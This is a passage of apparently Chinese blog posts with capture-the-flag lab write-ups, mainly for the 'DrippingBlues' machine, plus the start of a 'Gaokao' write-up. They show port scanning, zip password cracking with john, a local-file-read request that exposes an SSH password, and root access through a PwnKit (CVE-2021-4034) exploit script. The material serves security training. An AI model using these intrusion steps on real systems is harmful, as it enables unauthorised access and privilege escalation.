http-robots.<span class="params">txt:</span> <span class="number">2</span> disallowed entries </span><br><span class="line">|_<span class="symbol">/dripisreal.txt</span> <span class="symbol">/etc/dripispowerful.html</span></span><br><span class="line">|<span class="params">_http-title:</span> Site doesn&#x27;t have a title (text<span class="symbol">/html</span>; <span class="attr">charset</span><span class="operator">=</span>UTF-<span class="number">8</span>).</span><br><span class="line">MAC <span class="params">Address:</span> C8:<span class="number">21</span>:<span class="number">58</span>:<span class="number">16</span>:CF:C4 (Intel Corporate)</span><br><span class="line">Device <span class="params">type:</span> general purpose|router</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">4</span>.X|<span class="number">5</span>.X, MikroTik RouterOS <span class="number">7</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5</span> cpe:<span class="operator">/</span>o:mikrotik:routeros:<span class="number">7</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5.6</span>.<span class="number">3</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">4.15</span> <span class="operator">-</span> <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>), MikroTik RouterOS <span class="number">7.2</span> <span class="operator">-</span> <span class="number">7.5</span> (Linux <span class="number">5.6</span>.<span class="number">3</span>)</span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line">Service <span class="params">Info:</span> <span class="params">OSs:</span> Unix, Linux; <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT      ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">26.10</span> ms bogon (<span class="number">192.168</span>.<span class="number">58.44</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">11.22</span> seconds</span><br></pre></td></tr></table></figure></div>
<p>开放21 22 80<br>先去匿名访问一下21端口</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MARKDOWN"><figure class="iseeu highlight /markdown"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# ftp anonymous@192.168.58.44 </span><br><span class="line"></span><br><span class="line">ftp&gt; ls -al</span><br><span class="line">229 Entering Extended Passive Mode (|||27551|)</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">drwxr-xr-x    2 0        0            4096 Sep 19  2021 .</span><br><span class="line">drwxr-xr-x    2 0        0            4096 Sep 19  2021 ..</span><br><span class="line">-rwxrwxrwx    1 0        0             471 Sep 19  2021 respectmydrip.zip</span><br><span class="line">ftp&gt; get respectmydrip.zip</span><br><span class="line">local: respectmydrip.zip remote: respectmydrip.zip</span><br><span class="line">229 Entering Extended Passive Mode (|||54209|)</span><br><span class="line">150 Opening BINARY mode data connection for respectmydrip.zip (471 bytes).</span><br><span class="line">100% |<span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">**<span class="emphasis">*|   471        2.46 MiB/s    00:00 ETA</span></span></span><br><span class="line"><span class="emphasis"><span class="strong">226 Transfer complete.</span></span></span><br><span class="line"><span class="emphasis"><span class="strong">471 bytes received in 00:00 (27.75 KiB/s)</span></span></span><br></pre></td></tr></table></figure></div>
<p>发现有一个zip文件，拿到本地来看看  有密码就用john破解一下</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># unzip respectmydrip.zip                 </span></span><br><span class="line">Archive:  respectmydrip.<span class="built_in">zip</span></span><br><span class="line">[respectmydrip.<span class="built_in">zip</span>] respectmydrip.txt password: </span><br><span class="line">   skipping: respectmydrip.txt       incorrect password</span><br><span class="line">  inflating: secret.<span class="built_in">zip</span>              </span><br><span class="line">                                                                                                                                                        </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># zip2john respectmydrip.zip &gt; hash</span></span><br><span class="line">ver <span class="number">2.0</span> respectmydrip.<span class="built_in">zip</span>/respectmydrip.txt PKZIP Encr: cmplen=<span class="number">32</span>, decmplen=<span class="number">20</span>, crc=5C92F12B ts=96AB cs=5c92 <span class="built_in">type</span>=<span class="number">0</span></span><br><span class="line">ver <span class="number">2.0</span> respectmydrip.<span class="built_in">zip</span>/secret.<span class="built_in">zip</span> <span class="keyword">is</span> <span class="keyword">not</span> encrypted, <span class="keyword">or</span> stored <span class="keyword">with</span> non-handled compression <span class="built_in">type</span></span><br><span class="line">                                                                                                                                                        </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># john hash                                            </span></span><br><span class="line">Using default <span class="built_in">input</span> encoding: UTF-<span class="number">8</span></span><br><span class="line">Loaded <span class="number">1</span> password <span class="built_in">hash</span> (PKZIP [<span class="number">32</span>/<span class="number">64</span>])</span><br><span class="line">Will run <span class="number">4</span> OpenMP threads</span><br><span class="line">Proceeding <span class="keyword">with</span> single, rules:Single</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> <span class="keyword">or</span> Ctrl-C to abort, almost <span class="built_in">any</span> other key <span class="keyword">for</span> status</span><br><span class="line">Almost done: Processing the remaining buffered candidate passwords, <span class="keyword">if</span> <span class="built_in">any</span>.</span><br><span class="line">Proceeding <span class="keyword">with</span> wordlist:/usr/share/john/password.lst</span><br><span class="line">Proceeding <span class="keyword">with</span> incremental:ASCII</span><br><span class="line">072528035        (respectmydrip.<span class="built_in">zip</span>/respectmydrip.txt)     </span><br><span class="line">1g <span class="number">0</span>:<span class="number">00</span>:01:<span class="number">44</span> DONE <span class="number">3</span>/<span class="number">3</span> (<span class="number">2025</span>-03-08 <span class="number">21</span>:09) <span class="number">0.009575</span>g/s 33407Kp/s 33407Kc/s 33407KC/s <span class="number">072238647.</span><span class="number">.078169144</span></span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display <span class="built_in">all</span> of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STATA"><figure class="iseeu highlight /stata"><table><tr><td class="code"><pre><span class="line">──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# unzip respectmydrip.<span class="keyword">zip</span></span><br><span class="line">Archive:  respectmydrip.<span class="keyword">zip</span></span><br><span class="line">[respectmydrip.<span class="keyword">zip</span>] respectmydrip.txt password: </span><br><span class="line"> extracting: respectmydrip.txt       </span><br><span class="line"><span class="keyword">replace</span> secret.<span class="keyword">zip</span>? [y]es, [<span class="keyword">n</span>]o, [A]ll, [<span class="keyword">N</span>]<span class="keyword">one</span>, [r]ename: y</span><br><span class="line">  inflating: secret.<span class="keyword">zip</span>      </span><br><span class="line"></span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="keyword">cat</span>  respectmydrip.txt      </span><br><span class="line">just focus <span class="keyword">on</span> <span class="string">&quot;drip&quot;</span>   </span><br></pre></td></tr></table></figure></div>

<p>给了一个”drip”提示，然后这个secret.zip也要密码，drip不是这个secret的密码</p>
<h1 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GHERKIN"><figure class="iseeu highlight /gherkin"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># curl http://192.168.58.44/</span></span><br><span class="line"><span class="variable">&lt;html&gt;</span></span><br><span class="line"><span class="variable">&lt;body&gt;</span></span><br><span class="line">driftingblues is hacked again so it&#x27;s now called drippingblues. :D hahaha</span><br><span class="line"><span class="variable">&lt;br&gt;</span></span><br><span class="line">by</span><br><span class="line"><span class="variable">&lt;br&gt;</span></span><br><span class="line">travisscott &amp; thugger</span><br><span class="line"><span class="variable">&lt;/body&gt;</span></span><br><span class="line"><span class="variable">&lt;/html&gt;</span>  </span><br></pre></td></tr></table></figure></div>

<p>从robots.txt中得到两个目录</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># curl 192.168.58.44/robots.txt</span></span><br><span class="line"><span class="params">User-agent:</span> <span class="operator">*</span></span><br><span class="line"><span class="params">Disallow:</span> <span class="symbol">/dripisreal.txt</span></span><br><span class="line"><span class="params">Disallow:</span> <span class="operator">/</span>etc<span class="operator">/</span>dripispowerful.html</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># curl 192.168.58.44//dripisreal.txt</span></span><br><span class="line">hello dear hacker wannabe,</span><br><span class="line"></span><br><span class="line">go <span class="keyword">for</span> this lyrics:</span><br><span class="line"></span><br><span class="line"><span class="keyword">https</span>://www.azlyrics.com/lyrics/youngthug/constantlyhating.html</span><br><span class="line"></span><br><span class="line">count <span class="keyword">the</span> n <span class="keyword">words</span> <span class="keyword">and</span> <span class="built_in">put</span> them side <span class="keyword">by</span> side <span class="keyword">then</span> md5sum <span class="keyword">it</span></span><br><span class="line"></span><br><span class="line">ie, hellohellohellohello &gt;&gt; md5sum hellohellohellohello</span><br><span class="line"></span><br><span class="line"><span class="keyword">it</span><span class="string">&#x27;s the password of ssh                                                                                                                                                        </span></span><br></pre></td></tr></table></figure></div>
<p>按照他的说法就是把这个歌词里面有n的单词都提取出来让后排列在一起，但是我试了一下grep “n” 发现带有n的单词数量吓人，就先找别的信息了<br>用gobuster扫描的目录，发现首页是index.php</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line"><span class="section">└─# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u 192.168.58.44  -x php,js,txt,jpg,png</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">Gobuster v3.6</span><br><span class="line"><span class="section">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">[+] Url:                     http://192.168.58.44</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Extensions:              php,js,txt,jpg,png</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/.php                 (Status: 403) [Size: 278]</span><br><span class="line">/index.php            (Status: 200) [Size: 138]</span><br><span class="line">/robots.txt           (Status: 200) [Size: 78]</span><br><span class="line">/.php                 (Status: 403) [Size: 278]</span><br></pre></td></tr></table></figure></div>
<p>这个php文件会不会有什么后门呢  用wfuzz扫一下没有扫出来，但是刚才ftp提取的文件里面有说<code>just focus on &quot;drip&quot;  </code>所以用drip试试<br>但是我用drip输入指令和文件什么返回都没有<br><img src="https://pic1.imgdb.cn/item/67cc45d0066befcec6e15e39.png"><br>卡住看了下wp后，原来要读取刚才robots.txt里面给的文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">view-source:http://192.168.58.44/index.php?drip=/etc/dripispowerful.html</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&#x27;drippin.jpg&#x27;</span>);</span></span><br><span class="line"><span class="language-css"><span class="attribute">background-repeat</span>: no-repeat;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">font-family</span>: Segoe;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">&#x27;segoeui.ttf&#x27;</span>);</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.mainfo</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#000000</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">font-family</span>: <span class="string">&#x27;Segoe&#x27;</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">padding</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">background-color</span>: <span class="number">#ffffff</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">margin-top</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.emoji</span> &#123;</span></span><br><span class="line"><span class="language-css">	<span class="attribute">width</span>: <span class="number">32px</span>;</span></span><br><span class="line"><span class="language-css">	&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">password is:</span><br><span class="line">imdrippinbiatch</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">driftingblues is hacked again so it&#x27;s now called drippingblues. :D hahaha</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">by</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">travisscott &amp; thugger</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>得到密码<code>imdrippinbiatch</code> 尝试了几个用户名，最后登录到thugger这个用户了</p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">thugger@drippingblues:~$ ls -al</span><br><span class="line">total 64</span><br><span class="line">drwxr-xr-x<span class="number"> 14 </span>thugger thugger<span class="number"> 4096 </span>Sep<span class="number"> 19 </span><span class="number"> 2021 </span>.</span><br><span class="line">drwxr-xr-x <span class="number"> 3 </span>root    root   <span class="number"> 4096 </span>Sep<span class="number"> 18 </span><span class="number"> 2021 </span>..</span><br><span class="line">-rw------- <span class="number"> 1 </span>thugger thugger   <span class="number"> 8 </span>Sep<span class="number"> 19 </span><span class="number"> 2021 </span>.bash_history</span><br><span class="line">drwxr-xr-x<span class="number"> 10 </span>thugger thugger<span class="number"> 4096 </span>Sep<span class="number"> 19 </span><span class="number"> 2021 </span>.cache</span><br><span class="line">drwxr-xr-x<span class="number"> 11 </span>thugger thugger<span class="number"> 4096 </span>Sep<span class="number"> 19 </span><span class="number"> 2021 </span>.config</span><br><span class="line">drwxr-xr-x <span class="number"> 2 </span>thugger thugger<span class="number"> 4096 </span>Sep<span class="number"> 18 </span><span class="number"> 2021 </span>Desktop</span><br><span class="line">drwxr-xr-x <span class="number"> 2 </span>thugger thugger<span class="number"> 4096 </span>Sep<span class="number"> 18 </span><span class="number"> 2021 </span>Documents</span><br><span class="line">drwxr-xr-x <span class="number"> 2 </span>thugger thugger<span class="number"> 4096 </span>Sep<span class="number"> 18 </span><span class="number"> 2021 </span>Downloads</span><br><span class="line">drwxr-xr-x <span class="number"> 3 </span>thugger thugger<span class="number"> 4096 </span>Sep<span class="number"> 19 </span><span class="number"> 2021 </span>.local</span><br><span class="line">drwxr-xr-x <span class="number"> 2 </span>thugger thugger<span class="number"> 4096 </span>Sep<span class="number"> 18 </span><span class="number"> 2021 </span>Music</span><br><span class="line">drwxr-xr-x <span class="number"> 2 </span>thugger thugger<span class="number"> 4096 </span>Sep<span class="number"> 18 </span><span class="number"> 2021 </span>Pictures</span><br><span class="line">drwxr-xr-x <span class="number"> 2 </span>thugger thugger<span class="number"> 4096 </span>Sep<span class="number"> 18 </span><span class="number"> 2021 </span>Public</span><br><span class="line">drwx------ <span class="number"> 2 </span>thugger thugger<span class="number"> 4096 </span>Sep<span class="number"> 19 </span><span class="number"> 2021 </span>.ssh</span><br><span class="line">drwxr-xr-x <span class="number"> 2 </span>thugger thugger<span class="number"> 4096 </span>Sep<span class="number"> 18 </span><span class="number"> 2021 </span>Templates</span><br><span class="line">-r-x------ <span class="number"> 1 </span>thugger thugger  <span class="number"> 32 </span>Sep<span class="number"> 19 </span><span class="number"> 2021 </span>user.txt</span><br><span class="line">drwxr-xr-x <span class="number"> 2 </span>thugger thugger<span class="number"> 4096 </span>Sep<span class="number"> 18 </span><span class="number"> 2021 </span>Videos</span><br></pre></td></tr></table></figure></div>
<p>这个用户的目录下面除了user.txt是有用的其他都是空文件夹。 也没有sudo命令<br>用linpeas.sh扫描了一下发现</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">-rwsr-xr-x<span class="number"> 1 </span>root root             31K Aug<span class="number"> 16 </span><span class="number"> 2019 </span>/usr/bin/pkexec  ---&gt;  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)</span><br><span class="line">-rwsr-xr-x<span class="number"> 1 </span>root root            146K Jan<span class="number"> 19 </span><span class="number"> 2021 </span>/snap/core18/2128/usr/bin/sudo</span><br></pre></td></tr></table></figure></div>
<p>这两个可疑的东西 但是我尝试了上面的那个漏洞没有成功</p>
<p>上传linux-exploit-suggester.sh扫描可疑的漏洞 发现有pwnkit</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="COQ"><figure class="iseeu highlight /coq"><table><tr><td class="code"><pre><span class="line">[+] [CVE<span class="number">-2021</span><span class="number">-4034</span>] PwnKit</span><br><span class="line"></span><br><span class="line">   Details: https://www.qualys.com/<span class="number">2022</span>/<span class="number">01</span>/<span class="number">25</span>/cve<span class="number">-2021</span><span class="number">-4034</span>/pwnkit.txt</span><br><span class="line">   Exposure: probable</span><br><span class="line">   Tags: [ ubuntu=<span class="number">10</span>|<span class="type">11</span>|<span class="type">12</span>|<span class="type">13</span>|<span class="type">14</span>|<span class="type">15</span>|<span class="type">16</span>|<span class="type">17</span>|<span class="type">18</span>|<span class="type">19</span>|<span class="type">20</span>|<span class="type">21</span> ],debian=<span class="number">7</span>|<span class="type">8</span>|<span class="type">9</span>|<span class="type">10</span>|<span class="type">11</span>,fedora,manjaro</span><br><span class="line">   Download URL: https://codeload.github.com/berdav/CVE<span class="number">-2021</span><span class="number">-4034</span>/zip/main</span><br></pre></td></tr></table></figure></div>

<p>在github找到py脚本可以直接使用，靶机上有python3</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">thugger@drippingblues:~$ vi pwn.py</span><br><span class="line">thugger@drippingblues:~$ python3 pwn.py</span><br><span class="line">[+] Creating shared library <span class="keyword">for</span> exploit code.</span><br><span class="line">[-] <span class="attribute">GCONV_PATH</span>=. directory already exists, continuing.</span><br><span class="line">[+] Calling execve()</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line"><span class="attribute">uid</span>=0(root) <span class="attribute">gid</span>=1001(thugger) <span class="attribute">groups</span>=1001(thugger)</span><br></pre></td></tr></table></figure></div>
<p>这里其他也有很多漏洞可以提权 刚刚随便试了一个CVE-2021-3156也是可以的，github也有对应的py文件</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>前面出现的信息需要甄别，这题里面有没有的信息比如secret.zip 虚假的ssh密码获取方式 但是robots.txt中的内容我没有很好的完全利用上</li>
<li>新下载了linux-exploit-suggester.sh这个工具用来查找漏洞</li>
<li>漏洞最好用py的，可以在靶机上直接运行</li>
</ul>
]]></content>
      <categories>
        <category>靶场</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>靶场</tag>
        <tag>HMV</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhub-Gaokao</title>
    <url>/posts/58538.html</url>
    <content><![CDATA[<p>Vulnhub-Gaokao靶机复盘</p>
<span id="more"></span>
<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># nmap -A 192.168.179.139    </span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">09</span> <span class="number">18</span>:<span class="number">21</span> CST</span><br><span class="line">Nmap scan report for <span class="number">192.168</span>.<span class="number">179.139</span> (<span class="number">192.168</span>.<span class="number">179.139</span>)</span><br><span class="line">Host is up (<span class="number">0.0021</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">996</span> closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line"><span class="number">21</span><span class="symbol">/tcp</span>   open  ftp     ProFTPD <span class="number">1.3</span>.<span class="number">5</span>e</span><br><span class="line"><span class="number">22</span><span class="symbol">/tcp</span>   open  ssh     OpenSSH <span class="number">7.6</span>p1 Ubuntu <span class="number">4</span>ubuntu0.<span class="number">3</span> (Ubuntu Linux; protocol <span class="number">2.0</span>)</span><br><span class="line">| <span class="params">ssh-hostkey:</span> </span><br><span class="line">|   <span class="number">2048</span> <span class="number">48</span>:<span class="number">39</span>:<span class="number">31</span>:<span class="number">22</span>:fb:c2:<span class="number">03</span>:<span class="number">44</span>:a7:<span class="number">4</span>e:c0:fa:b8:ad:<span class="number">2</span>f:<span class="number">96</span> (RSA)</span><br><span class="line">|   <span class="number">256</span> <span class="number">70</span>:a7:<span class="number">74</span>:<span class="number">5</span>e:a3:<span class="number">79</span>:<span class="number">60</span>:<span class="number">28</span>:<span class="number">1</span>a:<span class="number">45</span>:<span class="number">4</span>c:ab:<span class="number">5</span>c:e7:<span class="number">87</span>:ad (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> <span class="number">9</span>c:<span class="number">35</span>:ce:f6:<span class="number">59</span>:<span class="number">66</span>:<span class="number">7</span>f:ae:c4:d1:<span class="number">21</span>:<span class="number">16</span>:d5:aa:<span class="number">56</span>:<span class="number">71</span> (ED25519)</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span>   open  http    Apache httpd <span class="number">2.4</span>.<span class="number">29</span> ((Ubuntu))</span><br><span class="line">|<span class="params">_http-server-header:</span> Apache<span class="symbol">/2.4.29</span> (Ubuntu)</span><br><span class="line">|<span class="params">_http-title:</span> Wellcome to <span class="params">Funbox:</span> Gaokao <span class="operator">!</span></span><br><span class="line"><span class="number">3306</span><span class="symbol">/tcp</span> open  mysql   MySQL <span class="number">5.7</span>.<span class="number">3</span>4-<span class="number">0</span>ubuntu0.<span class="number">18.04</span>.<span class="number">1</span></span><br><span class="line">| <span class="params">mysql-info:</span> </span><br><span class="line">|   <span class="params">Protocol:</span> <span class="number">10</span></span><br><span class="line">|   <span class="params">Version:</span> <span class="number">5.7</span>.<span class="number">3</span>4-<span class="number">0</span>ubuntu0.<span class="number">18.04</span>.<span class="number">1</span></span><br><span class="line">|   Thread <span class="params">ID:</span> <span class="number">3</span></span><br><span class="line">|   Capabilities <span class="params">flags:</span> <span class="number">65535</span></span><br><span class="line">|   Some <span class="params">Capabilities:</span> LongPassword, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, SwitchToSSLAfterHandshake, FoundRows, DontAllowDatabaseTableColumn, Speaks41ProtocolOld, SupportsLoadDataLocal, Speaks41ProtocolNew, LongColumnFlag, Support41Auth, InteractiveClient, IgnoreSigpipes, SupportsTransactions, ODBCClient, SupportsCompression, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments</span><br><span class="line">|   <span class="params">Status:</span> Autocommit</span><br><span class="line">|   <span class="params">Salt:</span> k%\x0E5s72S\x1B<span class="operator">!</span><span class="operator">+</span>\x1F26p\x1C\x02I0T</span><br><span class="line">|_  Auth Plugin <span class="params">Name:</span> mysql_native_password</span><br><span class="line">MAC <span class="params">Address:</span> <span class="number">32</span>:<span class="number">5</span>F:D8:FC:<span class="number">12</span>:<span class="number">14</span> (Unknown)</span><br><span class="line">Device <span class="params">type:</span> general purpose|router</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">4</span>.X|<span class="number">5</span>.X, MikroTik RouterOS <span class="number">7</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5</span> cpe:<span class="operator">/</span>o:mikrotik:routeros:<span class="number">7</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5.6</span>.<span class="number">3</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">4.15</span> <span class="operator">-</span> <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>), MikroTik RouterOS <span class="number">7.2</span> <span class="operator">-</span> <span class="number">7.5</span> (Linux <span class="number">5.6</span>.<span class="number">3</span>)</span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line">Service <span class="params">Info:</span> <span class="params">OSs:</span> Unix, Linux; <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">2.11</span> ms <span class="number">192.168</span>.<span class="number">179.139</span> (<span class="number">192.168</span>.<span class="number">179.139</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">36.03</span> seconds</span><br></pre></td></tr></table></figure></div>

<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>web端是一个默认的ubuntu界面，说明只是开放了http服务，但是没有内容.<br>ftp可以匿名登录,把这个welcome下载下来</p>
